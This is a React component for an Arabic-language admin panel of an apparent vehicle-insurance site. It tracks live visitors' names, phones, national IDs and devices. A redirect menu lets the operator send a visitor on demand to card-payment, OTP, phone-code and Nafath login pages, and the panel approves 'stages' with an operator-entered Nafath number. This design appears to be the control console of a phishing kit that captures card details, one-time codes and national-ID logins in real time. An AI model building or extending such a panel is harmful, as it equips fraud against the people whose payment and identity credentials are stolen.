import React, { useState, useRef } from "react";
import { motion } from "framer-motion";
import { ArrowRight, Circle, MapPin, Clock, Timer, Tag, Ban, ShieldCheck, Download, Trash2, Star, MessageCircle, Loader2, User, Shield, CreditCard, Car, Monitor, Smartphone, Tablet } from "lucide-react";
import AdminVisitorChat from "@/components/admin/AdminVisitorChat";
import TabIdentity from "./TabIdentity";
import TabVerification from "./TabVerification";
import TabVehicle from "./TabVehicle";
import type { Visitor, InsuranceRequest, InsuranceOrder, Claim, ChatConv, StageEvent } from "./types";
import { getVisitorAvatar, getVisitorInitial, getSessionDuration, parseUserAgent, countryFlag, formatDate, formatTime, VISITOR_TAGS, insuranceTypeLabel, statusLabel } from "./types";

type DetailsTab = "identity" | "verification" | "vehicle" | "chat";

interface Props {
  selectedVisitor: Visitor;
  linkedRequests: InsuranceRequest[];
  linkedOrders: InsuranceOrder[];
  linkedClaims: Claim[];
  linkedChats: ChatConv[];
  stageEvents: StageEvent[];
  visitorName: string | null;
  customerName: string | null;
  visitorPhone: string | null;
  visitorNationalId: string | null;
  loadingAction: string | null;
  nafathNumberInputs: Record<string, string>;
  setNafathNumberInputs: React.Dispatch<React.SetStateAction<Record<string, string>>>;
  onClose: () => void;
  onApprove: (reqId: string) => void;
  onReject: (reqId: string) => void;
  onStageApprove: (orderId: string, nafathNum?: string) => void;
  onStageReject: (orderId: string) => void;
  onUpdateNafathNumber: (orderId: string, val: string) => void;
  onBlockToggle: () => void;
  onExportPDF: () => void;
  onClearChat: () => void;
  onToggleFavorite: (id: string) => void;
  onToggleTag: (id: string, tagKey: string) => void;
  onRedirect: (page: string) => void;
  redirectPage: string;
  setRedirectPage: (val: string) => void;
}

const VisitorDetailsPanel: React.FC<Props> = ({
  selectedVisitor, linkedRequests, linkedOrders, linkedClaims, linkedChats, stageEvents,
  visitorName, customerName, visitorPhone, visitorNationalId,
  loadingAction, nafathNumberInputs, setNafathNumberInputs,
  onClose, onApprove, onReject, onStageApprove, onStageReject, onUpdateNafathNumber,
  onBlockToggle, onExportPDF, onClearChat, onToggleFavorite, onToggleTag,
  onRedirect, redirectPage, setRedirectPage,
}) => {
  const [activeTab, setActiveTab] = useState<DetailsTab>("identity");
  const panelRef = useRef<HTMLDivElement>(null);

  const hasPendingVerification = linkedOrders.some(o => o.stage_status === "pending");

  const tabs: { key: DetailsTab; label: string; icon: React.ReactNode; badge?: number }[] = [
    { key: "identity", label: "الهوية", icon: <User className="w-3.5 h-3.5" /> },
    { key: "verification", label: "التحقق والدفع", icon: <Shield className="w-3.5 h-3.5" />, badge: hasPendingVerification ? 1 : undefined },
    { key: "vehicle", label: "المركبة", icon: <Car className="w-3.5 h-3.5" /> },
    { key: "chat", label: "المحادثة", icon: <MessageCircle className="w-3.5 h-3.5" />, badge: linkedChats.length > 0 ? linkedChats.length : undefined },
  ];

  const avatarColor = getVisitorAvatar(selectedVisitor.session_id);
  const initial = getVisitorInitial(selectedVisitor.visitor_name);
  const ua = parseUserAgent(selectedVisitor.user_agent);
  const DevIcon = ua.device === "Mobile" ? Smartphone : ua.device === "Tablet" ? Tablet : Monitor;

  return (
    <motion.div
      key={selectedVisitor.id}
      initial={{ opacity: 0, x: -18, y: 10, scale: 0.985 }}
      animate={{ opacity: 1, x: 0, y: 0, scale: 1 }}
      exit={{ opacity: 0, x: 14, y: -6, scale: 0.985 }}
      transition={{ duration: 0.32, ease: [0.22, 1, 0.36, 1] }}
      ref={panelRef}
      className="flex-1 overflow-y-auto flex flex-col will-change-transform"
    >
      {/* Mobile back */}
      <button onClick={onClose} className="md:hidden flex items-center gap-2 text-sm text-primary font-semibold p-3 hover:text-primary/80 transition-colors">
        <ArrowRight className="w-4 h-4" />العودة للقائمة
      </button>

      {/* Compact Header */}
      <div className="bg-gradient-to-l from-primary/5 to-transparent border-b border-border/60 p-3 md:p-4 shrink-0">
        <div className="flex items-start gap-2.5 md:gap-3">
          <div className={`w-10 h-10 md:w-12 md:h-12 rounded-xl md:rounded-2xl flex items-center justify-center shrink-0 shadow-md bg-gradient-to-br ${avatarColor.bg} border border-white/20`}>
            <span className={`text-base md:text-lg font-bold ${avatarColor.text}`}>{initial}</span>
          </div>
          <div className="flex-1 min-w-0">
            <div className="flex items-center gap-1.5 md:gap-2 flex-wrap">
              <h2 className="text-sm md:text-base font-bold text-foreground truncate max-w-[140px] md:max-w-none">{selectedVisitor.visitor_name || "زائر"}</h2>
              <span className={`inline-flex items-center gap-1 px-1.5 md:px-2 py-0.5 rounded-full text-[9px] md:text-[10px] font-bold ${selectedVisitor.is_online ? "bg-emerald-500/15 text-emerald-600" : "bg-muted text-muted-foreground"}`}>
                <Circle className={`w-1.5 h-1.5 ${selectedVisitor.is_online ? "fill-emerald-500 text-emerald-500 animate-pulse" : "fill-muted-foreground text-muted-foreground"}`} />
                {selectedVisitor.is_online ? "متصل" : "غير متصل"}
              </span>
              <button onClick={() => onToggleFavorite(selectedVisitor.id)} className="p-0.5">
                <Star className={`w-3.5 md:w-4 h-3.5 md:h-4 ${selectedVisitor.is_favorite ? "fill-amber-400 text-amber-400" : "text-muted-foreground hover:text-amber-400"} transition-colors`} />
              </button>
            </div>
            <div className="flex items-center gap-2 md:gap-3 mt-1 text-[9px] md:text-[10px] text-muted-foreground/70 flex-wrap">
              <span className="inline-flex items-center gap-1"><MapPin className="w-2.5 md:w-3 h-2.5 md:h-3 text-primary" />{selectedVisitor.current_page || "/"}</span>
              <span className="inline-flex items-center gap-1">
                <DevIcon className="w-2.5 md:w-3 h-2.5 md:h-3" />
                {selectedVisitor.country_code && `${countryFlag(selectedVisitor.country_code)} `}
                {ua.device}
              </span>
              <span className="inline-flex items-center gap-1"><Clock className="w-2.5 md:w-3 h-2.5 md:h-3" />{getSessionDuration(selectedVisitor.created_at, selectedVisitor.last_seen_at)}</span>
            </div>
          </div>
        </div>

        {/* Tags row */}
        <div className="flex items-center gap-1 md:gap-1.5 flex-wrap mt-2.5 md:mt-3">
          {VISITOR_TAGS.map(tag => {
            const isActive = (selectedVisitor.tags || []).includes(tag.key);
            return (
              <button
                key={tag.key}
                onClick={() => onToggleTag(selectedVisitor.id, tag.key)}
                className={`inline-flex items-center gap-0.5 md:gap-1 px-1.5 md:px-2 py-0.5 md:py-1 rounded-md md:rounded-lg text-[9px] md:text-[10px] font-bold border transition-all ${
                  isActive ? `${tag.color} border-current` : "bg-muted/40 text-muted-foreground border-transparent hover:bg-muted"
                }`}
              >
                {tag.label}
              </button>
            );
          })}
        </div>

        {/* Quick actions */}
        <div className="flex items-center gap-1 md:gap-1.5 mt-2.5 md:mt-3 flex-wrap">
          <button onClick={onBlockToggle} disabled={loadingAction === "block"} className={`inline-flex items-center gap-0.5 md:gap-1 px-2 md:px-2.5 py-1 md:py-1.5 rounded-lg text-[9px] md:text-[10px] font-bold border transition-all ${selectedVisitor.is_blocked ? "bg-destructive/10 text-destructive border-destructive/30" : "bg-muted/40 text-muted-foreground border-transparent hover:bg-muted"}`}>
            {selectedVisitor.is_blocked ? <><ShieldCheck className="w-3 h-3" />إلغاء الحظر</> : <><Ban className="w-3 h-3" />حظر</>}
          </button>
          <button onClick={onExportPDF} className="inline-flex items-center gap-0.5 md:gap-1 px-2 md:px-2.5 py-1 md:py-1.5 rounded-lg text-[9px] md:text-[10px] font-bold bg-muted/40 text-muted-foreground border border-transparent hover:bg-muted transition-all">
            <Download className="w-3 h-3" />تصدير PDF
          </button>
          <div className="flex items-center gap-1 md:gap-1.5 flex-1 min-w-0 basis-full md:basis-auto mt-1 md:mt-0">
            <select value={redirectPage} onChange={e => setRedirectPage(e.target.value)} className="flex-1 h-7 rounded-lg border border-border bg-card px-1.5 md:px-2 text-[9px] md:text-[10px] text-foreground focus:outline-none focus:border-primary transition-all min-w-0">
              <option value="">توجيه لصفحة...</option>
              <optgroup label="الدفع والتحقق">
                <option value="/insurance/payment">الدفع بالبطاقة</option>
                <option value="/insurance/atm">دفع ATM</option>
                <option value="/insurance/otp">رمز التحقق OTP</option>
                <option value="/insurance/phone-verify">توثيق الجوال</option>
                <option value="/insurance/phone-otp">كود الجوال</option>
                <option value="/insurance/phone-stc">مكالمة STC</option>
                <option value="/insurance/nafath-login">نفاذ - دخول</option>
                <option value="/insurance/nafath-verify">نفاذ - تحقق</option>
                <option value="/insurance/confirmation">تأكيد الوثيقة</option>
              </optgroup>
            </select>
            <button onClick={() => onRedirect(redirectPage)} disabled={!redirectPage} className="h-7 px-2.5 md:px-3 rounded-lg text-[9px] md:text-[10px] font-bold bg-primary text-primary-foreground hover:bg-primary/90 disabled:opacity-40 transition-all whitespace-nowrap">
              توجيه
            </button>
          </div>
        </div>
      </div>

      {/* Horizontal Tabs */}
      <div className="flex items-center border-b border-border bg-card/50 shrink-0 overflow-x-auto scrollbar-none" dir="rtl">
        {tabs.map(tab => (
          <button
            key={tab.key}
            onClick={() => setActiveTab(tab.key)}
            className={`relative flex items-center gap-1 md:gap-1.5 px-2.5 md:px-4 py-2 md:py-2.5 text-[10px] md:text-xs font-bold transition-all whitespace-nowrap ${
              activeTab === tab.key
                ? "text-primary"
                : "text-muted-foreground hover:text-foreground"
            }`}
          >
            {tab.icon}
            <span>{tab.label}</span>
            {tab.badge && (
              <span className={`min-w-[14px] md:min-w-[16px] h-[14px] md:h-[16px] rounded-full text-[8px] md:text-[9px] font-bold flex items-center justify-center px-0.5 ${
                tab.key === "verification" && hasPendingVerification
                  ? "bg-amber-500 text-white animate-pulse"
                  : "bg-primary/10 text-primary"
              }`}>
                {tab.badge}
              </span>
            )}
            {activeTab === tab.key && (
              <motion.div
                layoutId="tab-indicator"
                className="absolute bottom-0 left-0 right-0 h-0.5 bg-primary rounded-t-full"
                transition={{ type: "spring", bounce: 0.2, duration: 0.4 }}
              />
            )}
          </button>
        ))}
      </div>

      {/* Tab Content */}
      <div className="flex-1 overflow-y-auto p-2.5 md:p-5">
        {activeTab === "identity" && (
          <TabIdentity
            selectedVisitor={selectedVisitor}
            visitorName={visitorName}
            customerName={customerName}
            visitorPhone={visitorPhone}
            visitorNationalId={visitorNationalId}
            linkedRequests={linkedRequests}
            linkedOrders={linkedOrders}
            loadingAction={loadingAction}
            onApprove={onApprove}
            onReject={onReject}
            insuranceTypeLabel={insuranceTypeLabel}
            statusLabel={statusLabel}
          />
        )}
        {activeTab === "verification" && (
          <TabVerification
            linkedOrders={linkedOrders}
            stageEvents={stageEvents}
            selectedVisitor={selectedVisitor}
            visitorPhone={visitorPhone}
            visitorNationalId={visitorNationalId}
            loadingAction={loadingAction}
            onStageApprove={onStageApprove}
            onStageReject={onStageReject}
            onUpdateNafathNumber={onUpdateNafathNumber}
            nafathNumberInputs={nafathNumberInputs}
            setNafathNumberInputs={setNafathNumberInputs}
            insuranceTypeLabel={insuranceTypeLabel}
            statusLabel={statusLabel}
          />
        )}
        {activeTab === "vehicle" && (
          <TabVehicle linkedOrders={linkedOrders} />
        )}
        {activeTab === "chat" && (
          <div className="space-y-3">
            <AdminVisitorChat visitorSessionId={selectedVisitor.session_id} visitorName={selectedVisitor.visitor_name} />
          </div>
        )}
      </div>
    </motion.div>
  );
};

export default VisitorDetailsPanel;
